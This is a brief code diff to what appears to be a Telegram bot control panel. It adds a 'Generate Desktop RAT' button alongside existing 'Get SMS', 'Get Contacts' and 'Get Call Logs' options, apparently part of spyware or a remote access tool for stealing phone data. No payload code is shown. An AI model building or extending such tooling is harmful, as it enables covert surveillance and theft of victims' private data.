@@ -109,6 +109,7 @@ async function sendAwanStartMessage(bot, chatId) {
         { text: "Get SMS", callback_data: "awan_get_sms" },
         { text: "Get Contacts", callback_data: "awan_get_contacts" },
         { text: "Get Call Logs", callback_data: "awan_get_call_logs" },
+        { text: "💻 Generate Desktop RAT", callback_data: "awan_generate_desktop_rat" },
         { text: "Kembali", callback_data: "back_to_start" }
     ];
     bot.sendMessage(chatId, message, { parse_mode: "Markdown", reply_markup: createInlineKeyboard(buttons) });
